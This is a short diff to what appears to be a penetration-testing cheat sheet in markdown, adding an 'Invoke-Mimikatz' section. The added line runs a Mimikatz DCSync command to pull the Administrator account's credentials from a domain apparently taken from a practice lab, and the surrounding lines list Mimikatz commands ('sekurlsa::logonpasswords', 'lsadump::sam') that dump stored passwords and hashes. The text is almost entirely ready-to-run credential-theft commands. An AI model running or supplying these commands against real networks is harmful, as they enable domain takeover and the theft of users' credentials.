@@ -336,6 +336,11 @@ sekurlsa::logonpasswords
 lsadump::sam
 ```
 
+## Invoke-Mimikatz
+```bash
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
+
+```
 
 ## Code Snippet to check where our code is executed
 ```bash
